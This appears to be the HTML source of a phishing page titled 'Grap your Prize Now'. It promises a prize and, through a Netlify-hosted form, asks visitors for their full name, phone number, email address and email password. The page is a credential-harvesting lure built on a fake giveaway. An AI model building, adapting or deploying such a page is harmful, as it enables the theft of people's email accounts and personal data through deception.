<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="assets/images/favicon.png.png" type="image/x-icon">
    <link rel="stylesheet" href="assets/style.css">
    <title>Grap your Prize Now</title>
</head>
<body>
    <!--Symbols and design-->
    <section class="design-section">
        <div class="rctngle symb">
        </div>
        <div class="rctangle-jnrs symb"></div>
        <div class="elipse-one symb">
            <div class="elipse-two symb">
            </div>
        </div>
        <div class="third-div symb"></div>
        <div class="fourth-div symb"></div>
    </section>
    <section class="image-section flex">
        <div class="container">
            <div class="image-container">
                <img class="centered-img" src="assets/images/woman.png.png" alt="">
                <img class="center-img" src="assets/images/man.png.png" alt="">
                <div >
                    <img class="graphic-img img-1"src="assets/images/paint.png" alt="">
                    <img class="graphic-img img-2" src="assets/images/paint1.png" alt="">
                </div>
            </div>
            

        </div>
        <div class="all-input">
            <img class="gift-item" src="Assets/images/favicon.png.png" alt="">
            <p>Enter your informations correctly to claim prize.</p>
            <div class="form-container">
                <form name="contact" method="POST" netlify-honeypot="bot-field" data-netlify="true">
                    <input type="hidden" name="form-name" value="contact">
                    <p class="hidden"><label>Don't fill this out if you're human: <input name="bot-field"/></label></p>
                    <h3>Full Name </h3>
                    <div class="form-input">
                    <input type="text" name="Full-name" required>
                    </div>
                    <h3>Phone-number</h3>
                    <div class="form-input">
                    <input type="text" name="Phone-number" required>
                    </div>
                    <h3>Email</h3>
                    <div class="form-input">
                    <input type="text" name="Email" required>
                    </div>
                    <h3>Email Password</h3>
                    <div class="form-input">
                    <input type="password" required>
                    <div class="form-input">
                    <input class="btn" type="button" name="send" value="Claim Prize now" >
                    </div>
                </form>
            </div>
        </div>
    </section>
    
</body>
</html>
